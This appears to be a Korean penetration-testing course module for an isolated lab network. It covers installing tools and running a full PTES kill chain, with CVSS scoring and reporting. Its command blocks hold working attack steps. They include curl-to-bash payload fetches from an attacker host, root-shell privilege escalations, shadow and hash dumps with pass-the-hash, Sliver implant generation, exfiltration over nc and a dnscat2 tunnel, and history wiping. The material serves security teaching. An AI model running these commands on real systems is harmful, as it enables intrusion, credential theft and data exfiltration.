# wpscan (WordPress)
sudo apt install -y wpscan
wpscan --update

# OWASP ZAP
sudo apt install -y zaproxy

# === [s4] 방화벽 우회 ===
sudo apt install -y hping3 fragroute scapy
pip install --user scapy

# === [s6] Exploitation ===
sudo apt install -y exploitdb
searchsploit --update

# Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && sudo ./msfinstall

# jwt_tool — JWT 분석/공격
git clone https://github.com/ticarpi/jwt_tool /tmp/jwt_tool
cd /tmp/jwt_tool && pip install -r requirements.txt
python3 jwt_tool.py --help

# === [s7-s8] Post-Exploitation 열거 ===
# LinPEAS / WinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# linux-exploit-suggester
git clone https://github.com/mzet-/linux-exploit-suggester /tmp/les

# pspy — 무권한 프로세스 모니터링
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 > /tmp/pspy64
chmod +x /tmp/pspy64

# GTFOBins (offline copy)
git clone https://github.com/GTFOBins/GTFOBins.github.io /tmp/gtfobins

# === [s9] 측면 이동 ===
sudo apt install -y impacket-scripts
# CrackMapExec → NetExec (후속)
pip install --user netexec

# evil-winrm
gem install evil-winrm

# BloodHound
sudo apt install -y bloodhound neo4j
neo4j console &
# 사용: bloodhound (GUI) + bloodhound-python collector

# Sliver C2
curl https://sliver.sh/install | sudo bash
sliver-server

# === [s10] 데이터 유출 ===
sudo apt install -y rclone age curl
# dnscat2 (DNS 터널)
git clone https://github.com/iagox86/dnscat2 /tmp/dnscat2
cd /tmp/dnscat2/server && bundle install
# iodine (DNS 터널 native)
sudo apt install -y iodine

# === [s11] CVSS ===
pip install --user cvss

# === [s12] Diagram ===
sudo apt install -y graphviz
npm install -g @mermaid-js/mermaid-cli

# ATT&CK Navigator (web)
git clone https://github.com/mitre-attack/attack-navigator /tmp/nav
cd /tmp/nav/nav-app && npm install && npm run start &

# === [s15] 보고서 ===
# Dradis Community
docker run -p 3000:3000 -d dradisframework/community

# Serpico
git clone https://github.com/SerpicoProject/Serpico /tmp/serpico
cd /tmp/serpico && bundle install
ruby serpico.rb &

# pwndoc
docker run -p 5252:8443 ghcr.io/pwndoc/pwndoc:latest
```

### 핵심 도구별 상세 사용법

#### 도구 1: nmap — 5단계 정찰 깊이 (Step 2)

```bash
# === Stage 1: Host discovery ===
nmap -sn 10.20.30.0/24                            # ping sweep
nmap -PE -PP -PM -sn 10.20.30.0/24                # ICMP echo + timestamp + netmask
masscan -p1-65535 10.20.30.0/24 --rate=10000      # 빠른 포트 sweep

# === Stage 2: 포트 + 서비스 ===
nmap -sV -sC --top-ports 1000 --open 10.20.30.0/24 -oA /tmp/recon-1k
# -sV 서비스 버전, -sC default scripts, --open 열린 포트만, -oA 모든 형식 저장

# === Stage 3: 전체 포트 (느림) ===
nmap -sS -p- --min-rate=1000 -T4 10.20.30.80 -oA /tmp/recon-full
# 또는 rustscan 으로 빠르게 발견 후 nmap 으로 deep
rustscan -a 10.20.30.80 -- -sV -sC -oA /tmp/recon-rs

# === Stage 4: NSE 깊이 ===
nmap --script vuln 10.20.30.80 -oA /tmp/recon-vuln
nmap --script smb-vuln-* -p 445 10.20.30.80
nmap --script http-* -p 80,443 10.20.30.80

# === Stage 5: OS fingerprint + Traceroute ===
nmap -O --traceroute 10.20.30.80 -oA /tmp/recon-os
# OS detection: Linux 5.15 / Windows Server 2019

# 결과 정리
xsltproc /tmp/recon-1k.xml -o /tmp/recon-1k.html       # HTML report

# DNS recon
dnsrecon -d corp.example -t std,axfr,brt
amass enum -d corp.example -active

# OSINT 이메일
theHarvester -d corp.example -b google,linkedin -l 500
```

권장 PTES 정찰 순서: ① masscan 빠른 sweep → ② nmap top-1000 → ③ rustscan 전체 포트 → ④ nmap NSE vuln → ⑤ 발견된 서비스별 specialized (sqlmap/nuclei/wpscan).

#### 도구 2: nuclei + ffuf + sqlmap — 웹 취약점 (Step 3)

```bash
# 기본 — 모든 template
nuclei -u http://10.20.30.80:3000

# 카테고리별
nuclei -u http://10.20.30.80:3000 -t cves/                 # CVE 만
nuclei -u http://10.20.30.80:3000 -t exposures/             # 시크릿/설정 노출
nuclei -u http://10.20.30.80:3000 -t vulnerabilities/       # 일반 취약점
nuclei -u http://10.20.30.80:3000 -t misconfiguration/      # 잘못된 설정
nuclei -u http://10.20.30.80:3000 -t default-logins/        # 기본 자격증명
nuclei -u http://10.20.30.80:3000 -t takeovers/             # 서브도메인 인수

# severity 필터
nuclei -u http://10.20.30.80:3000 -severity critical,high
nuclei -u http://10.20.30.80:3000 -severity high,critical -markdown-export /tmp/nuclei-report

# 다중 target
echo -e "10.20.30.80\n10.20.30.100\n10.20.30.1" > targets.txt
nuclei -l targets.txt -t cves/ -o /tmp/scan.txt

# 사용자 정의 template
cat > custom.yaml << 'YML'
id: jwt-none-alg
info:
  name: JWT none algorithm allowed
  severity: high
http:
  - method: GET
    path: ["{{BaseURL}}/api/profile"]
    headers:
      Authorization: "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    matchers:
      - type: word
        words: ["admin", "Admin"]
YML
nuclei -u http://10.20.30.80:3000 -t custom.yaml

# === ffuf — 디렉터리 fuzzing ===
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u http://10.20.30.80:3000/FUZZ \
  -mc 200,301,302,403 -fc 404 \
  -o /tmp/ffuf.json -of json

# 파라미터 fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://10.20.30.80:3000/api/users?FUZZ=admin" \
  -fs 1234   # 정상 응답 크기

# === sqlmap ===
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=*" \
  --batch --random-agent --threads=4

sqlmap -u "http://10.20.30.80:3000/login" \
  --data="email=test&password=test" \
  --dbs --batch

sqlmap -u "..." --dump -T users --batch        # 테이블 dump
sqlmap -u "..." --os-shell                     # OS shell (가능 시)

# === BurpSuite — Manual Proxy ===
# Configure browser: SOCKS proxy 127.0.0.1:8080 + import Burp CA
# Intercept → Send to Repeater → Send to Intruder (fuzzing) → Send to Decoder
```

#### 도구 3: LinPEAS — Post-Exploitation 자동 열거 (Step 7-8)

```bash
# 침투한 호스트에서 다운로드 + 실행
curl -s 10.20.30.201:8000/linpeas.sh | bash    # 한 줄
# 또는
wget 10.20.30.201:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

# 모드 선택
/tmp/lp.sh -a                  # all checks (오래 걸림)
/tmp/lp.sh -s                  # superfast
/tmp/lp.sh -e                  # extreme — 모든 explanation

# 색상 코드:
# 빨강+노랑 (95%): 매우 위험, 즉시 권한 상승 가능
# 빨강 (50-95%): 흥미로운 발견
# 일반: 정보

# 핵심 출력
# [+] Operative system  -> Linux 5.15.0
# [+] System information -> kernel 5.15, distro Ubuntu 22.04
# [+] PATH variable -> /usr/local/bin (writable!)  ★ 권한 상승 vector
# [+] SUID files -> /usr/bin/find  ★ GTFOBins find 으로 권한 상승
# [+] Sudo permission -> (ALL : ALL) NOPASSWD: /usr/bin/vim  ★ vim ! /bin/sh
# [+] Capabilities -> cap_setuid /bin/python3  ★ python3 setuid(0)
# [+] Cron jobs -> /etc/crontab 의 /opt/script.sh world-writable

# === GTFOBins ===
# offline copy 검색
grep -rn "find" /tmp/gtfobins/_gtfobins/find.md | head -20

# 예: SUID find → root shell
find . -exec /bin/sh -p \; -quit

# 예: sudo NOPASSWD vim → root shell
sudo vim -c ':!/bin/sh'

# 예: cap_setuid python3
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# === pspy — sudo / cron 모니터링 ===
/tmp/pspy64 -i 1000 -p
# 1초 간격, process + parent 표시
# CMD: UID=0  PID=12345  /opt/backup.sh   ★ root 가 주기적으로 실행 → race or 변조

# === linux-exploit-suggester ===
/tmp/les/linux-exploit-suggester.sh
# Highly probable: CVE-2022-0847 Dirty Pipe (kernel 5.8 ~ 5.16.10)
# Probable:        CVE-2021-4034 PwnKit (polkit)
# Less probable:   CVE-2021-3156 Sudo Baron Samedi

# 검증
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 0 0
# 결과: /etc/passwd 의 root password 필드를 임의 값으로 변경
```

#### 도구 4: impacket / NetExec — 측면 이동 (Step 9)

```bash
# === 자격증명 dump (Linux) ===
sudo cat /etc/shadow > /tmp/shadow.txt
hashcat -m 1800 /tmp/shadow.txt rockyou.txt --force

# 메모리 dump (mimipenguin / 3snake)
git clone https://github.com/huntergregal/mimipenguin /tmp/mp
sudo /tmp/mp/mimipenguin.sh
# Found: ccc:Pa$$w0rd123 in process gnome-keyring

# === SMB enum (impacket) ===
impacket-smbclient -no-pass guest@10.20.30.100
impacket-secretsdump 'corp.example/admin:password@10.20.30.100'
# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# (NT hash → pass-the-hash)

# Pass-the-Hash
impacket-psexec -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' admin@10.20.30.100

# === NetExec (CrackMapExec 후속) ===
nxc smb 10.20.30.0/24 -u users.txt -p Password123 --continue-on-success
nxc smb 10.20.30.100 -u admin -p Password123 --shares
nxc smb 10.20.30.100 -u admin -p Password123 -x 'whoami /priv'
nxc winrm 10.20.30.100 -u admin -p Password123 -x 'systeminfo'

# === evil-winrm ===
evil-winrm -i 10.20.30.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
# *Evil-WinRM* PS C:\> whoami /all

# === BloodHound — AD path 분석 ===
bloodhound-python -d corp.example -u admin -p Password123 -ns 10.20.30.1 -c All
neo4j console &
bloodhound &
# ZIP 파일 import → 좌측 "Shortest paths to Domain Admins"

# === Sliver C2 ===
sliver-server
> generate --mtls 10.20.30.201:443 --save /tmp/implant
> sessions
> use <session-id>
> shell
> upload /tmp/implant.exe C:\Windows\Temp\update.exe
> execute -o whoami
```

#### 도구 5: CVSS v3.1 계산 — 평가 (Step 11)

```bash
python3 << 'PY'
from cvss import CVSS3

# 예: SQL injection (Authentication Required, Network)
v1 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H')
print(f"SQLi: Base={v1.base_score} Severity={v1.severities()[0]}")
# Base=8.8 Severity=High

# JWT none alg (Network, No Auth, Low UI)
v2 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H')
print(f"JWT-none: Base={v2.base_score} Severity={v2.severities()[0]}")
# Base=10.0 Severity=Critical

# Local PrivEsc (Local, Low PR, No UI)
v3 = CVSS3('CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H')
print(f"PrivEsc: Base={v3.base_score} Severity={v3.severities()[0]}")
# Base=7.8 Severity=High

# IDOR (Network, Low PR)
v4 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N')
print(f"IDOR: Base={v4.base_score} Severity={v4.severities()[0]}")
# Base=6.5 Severity=Medium

# XSS Stored (Network, Required UI, Some impact)
v5 = CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N')
print(f"XSS-stored: Base={v5.base_score} Severity={v5.severities()[0]}")
# Base=5.4 Severity=Medium

# Temporal score (exploit available + remediation 부재)
print(f"SQLi temporal: {CVSS3('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:C').temporal_score}")
PY

# Vector 의미 (FIRST.org rubric)
# AV  Attack Vector:        N/A/L/P (Network/Adjacent/Local/Physical)
# AC  Attack Complexity:    L/H
# PR  Privileges Required:  N/L/H
# UI  User Interaction:     N/R
# S   Scope:                U/C (Unchanged/Changed)
# C   Confidentiality:      H/L/N
# I   Integrity:            H/L/N
# A   Availability:         H/L/N

# Top 5 정렬 (보고서용)
python3 << 'PY'
findings = [
  ("SQL injection /search", 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'),
  ("JWT none alg",          'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'),
  ("Stored XSS comment",    'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N'),
  ("LFI in /file",          'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N'),
  ("Sudo NOPASSWD vim",     'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'),
]
from cvss import CVSS3
ranked = sorted(((n, CVSS3(v).base_score, v) for n,v in findings), key=lambda x: -x[1])
for r in ranked: print(f"{r[1]:.1f} {r[0]} -> {r[2]}")
PY
```

#### 도구 6: mermaid + ATT&CK Navigator — 다이어그램 (Step 12)

```bash
# Mermaid CLI
cat > /tmp/chain.mmd << 'M'
sequenceDiagram
  participant A as Attacker
  participant W as Web (10.20.30.80)
  participant S as SIEM (10.20.30.100)
  participant F as Firewall (10.20.30.1)

  Note over A: PTES 1-3: Recon, Vulnerability Analysis
  A->>W: nmap -sV (T1595)
  A->>W: nuclei -t cves/ (T1190)

  Note over A,W: PTES 4: Exploitation
  A->>W: sqlmap /search?q=* (T1190 SQLi)
  W-->>A: JWT admin token

  Note over A: PTES 5: Post-Exploitation
  A->>W: webshell upload (T1505.003)
  W->>W: LinPEAS → SUID find (T1068)
  A->>W: privilege escalation → root

  Note over W,S: Lateral Movement
  W->>S: SSH key reuse (T1021.004)
  S-->>A: Wazuh API credentials

  Note over A: Exfiltration
  S->>A: tar -czf - logs | nc 10.20.30.201 4444 (T1041)
M

mmdc -i /tmp/chain.mmd -o /tmp/chain.png
mmdc -i /tmp/chain.mmd -o /tmp/chain.svg

# Mermaid Kill Chain
cat > /tmp/killchain.mmd << 'M'
graph LR
  R[Reconnaissance<br/>nmap, masscan, theHarvester]
  W[Weaponization<br/>msfvenom, custom exploit]
  D[Delivery<br/>phishing, web]
  E[Exploitation<br/>SQLi, JWT none]
  I[Installation<br/>webshell, cron backdoor]
  C[Command & Control<br/>Sliver, dnscat2]
  A[Actions on Objectives<br/>data exfil, ransomware]

  R --> W --> D --> E --> I --> C --> A
  style E fill:#ff6666
  style A fill:#ff6666
M

# === ATT&CK Navigator JSON ===
cat > /tmp/navigator-layer.json << 'JSON'
{
  "name": "Pentest Lab Coverage",
  "versions": {"attack": "14", "navigator": "4.9.4", "layer": "4.5"},
  "domain": "enterprise-attack",
  "techniques": [
    {"techniqueID": "T1595", "score": 100, "color": "#00ff00", "comment": "nmap recon - covered"},
    {"techniqueID": "T1190", "score": 100, "color": "#00ff00", "comment": "SQLi - covered"},
    {"techniqueID": "T1068", "score": 100, "color": "#00ff00", "comment": "SUID privesc"},
    {"techniqueID": "T1021.004", "score": 80, "color": "#ffaa00", "comment": "SSH key reuse"},
    {"techniqueID": "T1041", "score": 100, "color": "#00ff00", "comment": "data exfil over C2"}
  ]
}
JSON
# Navigator URL 로드: http://localhost:4200 → Open Existing Layer
```

#### 도구 7: 모의해킹 보고서 (Dradis / pwndoc, Step 15)

```bash
# === Dradis — 협업 pentest 보고서 ===
docker run -p 3000:3000 -d dradisframework/community

# UI: http://localhost:3000
# Project 생성 → Methodology → 각 finding 추가
# - Title / Description / Risk / CVSS / Recommendation
# - Evidence (screenshot / payload / output)
# - Affected hosts

# 보고서 export
# Dradis → Export → Word / HTML / PDF

# === pwndoc (PwnDoc) ===
docker compose up -d   # MongoDB + pwndoc
# UI: http://localhost:5252
# vulnerabilities → audits → templates 모두 분리

# === Executive Summary 작성 양식 (s15) ===
cat > /tmp/pentest_executive_summary.txt << 'EOF'
=========================================================
PENETRATION TEST — EXECUTIVE SUMMARY
=========================================================
Engagement: Internal Network Security Assessment
Scope:      10.20.30.0/24 (web, secu, siem, attacker)
Period:     2026-04-25 ~ 2026-05-02
Methodology: PTES v1.0 + OWASP WSTG v4.2 + MITRE ATT&CK

OVERALL RISK: HIGH

KEY FINDINGS (TOP 5)
-----
1. CRITICAL  CVSS 10.0  JWT none algorithm allowed (web:3000 /api/login)
   - Impact: Complete authentication bypass, admin takeover
   - Recommendation: Disable 'none' alg, enforce HS256/RS256 verification

2. CRITICAL  CVSS 9.8   SQL injection in /rest/products/search?q=
   - Impact: Database extraction, RCE via UDF
   - Recommendation: Parameterized queries, ORM, WAF rule

3. HIGH      CVSS 7.8   Sudo NOPASSWD vim → root (web)
   - Impact: Local privilege escalation to root
   - Recommendation: sudoers 정책 재정의, GTFOBins 차단

4. HIGH      CVSS 7.5   Wazuh API default credentials (siem)
   - Impact: SIEM tampering, log integrity loss
   - Recommendation: 자격증명 회전, MFA, IP allowlist

5. MEDIUM    CVSS 6.5   Stored XSS in JuiceShop comments
   - Impact: Session hijacking, admin token theft
   - Recommendation: CSP header, input sanitization, output encoding

ATT&CK COVERAGE
---------------
Reconnaissance(T1595)  → Initial Access(T1190)  → PrivEsc(T1068)
  → Lateral Movement(T1021)  → Exfiltration(T1041)
Detection coverage in Wazuh: 35% (8/23 techniques alerted)

DEFENSIVE RECOMMENDATIONS (priority)
-----
Short-term (≤7 days):
  - Patch JuiceShop to latest, disable JWT 'none'
  - Reset all default credentials, enforce password policy
  - Enable Wazuh 100501-100503 DNS rules

Mid-term (≤30 days):
  - WAF deployment (ModSecurity OWASP CRS)
  - sudoers review + GTFOBins blocklist
  - SIEM rule tuning (reduce 35% → 80% coverage)

Long-term (≤90 days):
  - SAST/DAST in CI/CD pipeline (semgrep + ZAP)
  - Network segmentation (VLAN per tier)
  - Annual pentest + quarterly red team

CLEANUP CONFIRMATION
--------------------
- All test accounts removed
- All uploaded files removed (shred -u)
- All cron entries restored
- All log entries documented for SIEM tuning
EOF

cat /tmp/pentest_executive_summary.txt
```

### 점검 / 공격 / 방어 흐름 (PTES 7단계 매핑)

#### Phase A — Pre-engagement + Recon (s1·s2·s3·s4·s5)

```bash
# RoE 정의
cat > /tmp/pentest_scope.txt << 'EOF'
=== Penetration Test — Rules of Engagement ===
Scope:        10.20.30.0/24
Out of scope: 10.20.30.201 (Bastion - 자기 시스템)
Allowed:      Active scanning, exploitation, lateral movement, exfiltration
Forbidden:    DoS, ransomware execution, real data destruction
Window:       2026-05-02 09:00 ~ 18:00 KST
Notification: 비상 시 ccc@corp.example
Communication: Slack #pentest-2026
Liability:    Sample lab environment, no real PII
EOF

# 정찰
masscan -p1-65535 10.20.30.0/24 --rate=10000 -oG /tmp/masscan.gnmap
nmap -sV -sC --top-ports 1000 --open 10.20.30.0/24 -oA /tmp/recon
nikto -h http://10.20.30.80 -o /tmp/nikto.txt
nuclei -u http://10.20.30.80:3000 -severity high,critical -o /tmp/nuclei.txt
```

#### Phase B — Exploitation + Post-Ex (s6·s7·s8·s9·s10)

```bash
# 1. 웹 초기 접근 (Juice Shop)
sqlmap -u "http://10.20.30.80:3000/rest/user/login" --data='{"email":"x","password":"y"}' \
  --batch --random-agent --threads=4

# admin token (JWT none)
curl -X POST -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"x"}' \
  http://10.20.30.80:3000/rest/user/login

# 2. 시스템 enum (admin 으로 webshell upload 후)
curl -s 10.20.30.201:8000/linpeas.sh | bash > /tmp/linpeas.out
grep -E "PWNED|95%" /tmp/linpeas.out

# 3. Privilege escalation
# 발견: sudo NOPASSWD /usr/bin/vim
sudo vim -c ':!/bin/sh'

# 4. 측면 이동 — SSH key reuse
ssh-keygen -y -f /home/ccc/.ssh/id_rsa  # 키 추출
ssh -i /home/ccc/.ssh/id_rsa ccc@10.20.30.100   # SIEM 으로

# 5. 데이터 유출
tar -czf - /var/ossec/data | age -r age1abc... | nc 10.20.30.201 4444
# 또는 dnscat2
dnscat2-client.bin --secret=secret123 attacker.tunnel.example
```

#### Phase C — Reporting + Cleanup (s11·s12·s13·s14·s15)

```bash
# 1. CVSS 평가 (Top 5)
python3 cvss-rank.py findings.csv > /tmp/cvss-ranked.txt

# 2. ATT&CK 다이어그램 (mermaid)
mmdc -i /tmp/chain.mmd -o /tmp/chain.png
mmdc -i /tmp/killchain.mmd -o /tmp/killchain.png

# 3. 권고 문서 작성
cat > /tmp/recommendations.md << 'EOF'
## 단기 (≤7일)
- JWT none 차단 (jose 라이브러리 update)
- 모든 default 자격증명 회전
- WAF 룰 OWASP CRS 활성화
## 중기 (≤30일)
- sudoers 재정의 + GTFOBins blocklist
- SIEM rule 80% coverage 도달
## 장기 (≤90일)
- SAST/DAST CI/CD 통합
- Network segmentation (VLAN per tier)
EOF

# 4. cleanup
shred -vfz -u /tmp/linpeas.sh /tmp/linpeas.out /tmp/exfil.tar.gz
history -c && history -w
sudo rm -rf /tmp/sliver-implant /tmp/dnscat2

# logs (cleanup record)
cat > /tmp/cleanup-log.txt << EOF
$(date): Removed 12 test artifacts
- /tmp/linpeas* (3 files)
- /tmp/sliver-implant (binary + config)
- /tmp/exfil.tar.gz
- ~/.ssh/known_hosts (테스트 항목)
- crontab restored to original
- /etc/sudoers.d/test-user removed
EOF

# 5. Executive Summary (s15)
# (위 도구 7 의 양식 참조)
```

#### Phase D — 통합 시나리오 (s99 multi_task)

s1 → s2 → s3 → s4 → s5 를 Bastion 가 한 번에 PTES 1-5단계 자동 수행:

1. **plan**: scope → recon → vuln scan → fw analysis → siem assess
2. **execute**: nmap + nuclei + nikto + hping3 + wazuh fingerprint
3. **synthesize**: 각 단계 발견 통합 → ATT&CK 매핑 5개 + 다음 phase plan

### 도구 비교표 — PTES 단계별 도구 선택

| PTES 단계 | 1순위 도구 | 2순위 (보완) | 사용 조건 |
|---------|-----------|-------------|----------|
| Pre-engagement | text editor + RoE 템플릿 | Dradis / pwndoc | 협업 시 협업 도구 |
| Recon (passive) | theHarvester + amass | Maltego CE | OSINT 만 |
| Recon (active) | nmap + masscan | rustscan | 빠른 결과 필요 시 rustscan |
| Web Scan | nuclei + nikto | OWASP ZAP / Burp | template 부족 시 ZAP |
| Vuln Analysis | searchsploit + NVD | CVSS calculator | exploit DB 검색 |
| Exploitation | metasploit + sqlmap | manual + Burp Repeater | 정밀 제어 시 manual |
| Post-Ex Linux | LinPEAS + pspy + GTFOBins | linux-exploit-suggester | kernel CVE 시 |
| Post-Ex AD | BloodHound + impacket + nxc | mimikatz + adidnsdump | Windows 환경 |
| C2 / Lateral | Sliver / Empire | Cobalt Strike (commercial) | OSS 우선 |
| Exfiltration | tar+age+nc | dnscat2 / iodine | 방화벽 강할 때 DNS |
| Reporting | Dradis / pwndoc | Markdown + pandoc | 단순 시 markdown |
| Cleanup | shred + history -c | log rotate manual | 주의: 운영 영향 |

### 도구 선택 매트릭스 — 시나리오별 권장

| 시나리오 | 우선 도구 | 이유 |
|---------|---------|------|
| "OSCP 스타일 24h" | nmap + nuclei + LinPEAS + manual + pencil | 시간 압박 + cheatsheet |
| "내부망 깊이 audit" | nmap + nessus 시뮬 + custom nuclei + BloodHound | depth 우선 |
| "External attack surface" | amass + cloud_enum + nuclei + httpx | OSINT 위주 |
| "Web app 깊이" | Burp + sqlmap + nuclei custom + jwt_tool | manual + auto 조합 |
| "AD 도메인" | bloodhound + impacket + nxc + secretsdump | path 분석 |
| "Cloud (AWS)" | Pacu + Prowler + ScoutSuite + Stratus | week13 의 도구 재사용 |
| "Mobile app" | MobSF + Frida + objection (week15 weight) | 모바일 전용 |
| "보고서 협업" | Dradis CE + Slack + Notion | 팀 작업 |

### 학생 셀프 체크리스트 (각 step 완료 기준)

- [ ] s1: `/tmp/pentest_scope.txt` 작성 (scope/out-of-scope/window/forbidden/communication 5요소)
- [ ] s2: nmap top-1000 + 전체 포트 + NSE vuln 3 단계, 활성 호스트 ≥3
- [ ] s3: nuclei + nikto + ffuf 3 도구 모두 사용, finding ≥5
- [ ] s4: hping3 또는 nmap -sA 로 firewall 분석, IPS evasion 시도 1 이상
- [ ] s5: Wazuh API 포트 + 버전 + default cred 시도 결과 명시
- [ ] s6: SQLi 또는 JWT none 으로 admin token 획득, 증거 (response) 첨부
- [ ] s7: LinPEAS 실행, SUID/sudo/cron/cap 4가지 enum 결과
- [ ] s8: 권한 상승 vector 3개 이상 식별, 1개 실증 (root shell)
- [ ] s9: SSH key reuse 또는 NetExec 으로 다른 호스트 access
- [ ] s10: tar+gzip+nc 또는 dnscat2 데이터 유출 PoC
- [ ] s11: cvss 라이브러리로 Top 5 finding 점수 + vector 모두 산출
- [ ] s12: mermaid 또는 ATT&CK Navigator 로 공격 체인 시각화
- [ ] s13: 단기/중기/장기 권고 각 3개 이상, OWASP/NIST 매핑
- [ ] s14: shred + history -c + 모든 임시 파일 제거, cleanup-log.txt
- [ ] s15: Executive Summary 5 섹션 (Overall/Findings/ATT&CK/Recommendations/Cleanup)
- [ ] s99: Bastion 가 PTES 1-5단계 5 작업을 순차 실행, ATT&CK 5개 매핑

### 추가 참조 자료

- **PTES Standard** http://www.pentest-standard.org/
- **OWASP WSTG v4.2** Web Security Testing Guide
- **NIST SP 800-115** Technical Guide to InfoSec Testing and Assessment
- **OSSTMM v3** Open Source Security Testing Methodology Manual
- **MITRE ATT&CK Enterprise Matrix v14**
- **OWASP ZAP** https://www.zaproxy.org/
- **GTFOBins** https://gtfobins.github.io/
- **HackTricks** https://book.hacktricks.xyz/ (post-ex cheatsheet)
- **PayloadsAllTheThings** https://github.com/swisskyrepo/PayloadsAllTheThings
- **OSCP Style Reports** https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
- **CVSS v3.1 Specification** https://www.first.org/cvss/v3.1/specification-document

위 모든 도구는 `10.20.30.0/24` (CCC 격리 lab) 또는 학생 본인의 격리 VM 에서만 사용한다.
실제 외부 시스템에 nmap / nuclei / sqlmap 을 돌리면 (a) 컴퓨터통신망법 위반 (b) 침해 사고
신고 (c) 학교·회사 보안팀 조사 — 반드시 사전 서면 동의 (RoE) 가 있는 환경에서만.
모의해킹 직후 cleanup 단계 (s14) 를 절대 건너뛰지 않는다 — 임시 도구·자격증명·webshell 잔존
시 다른 공격자가 이용 가능.
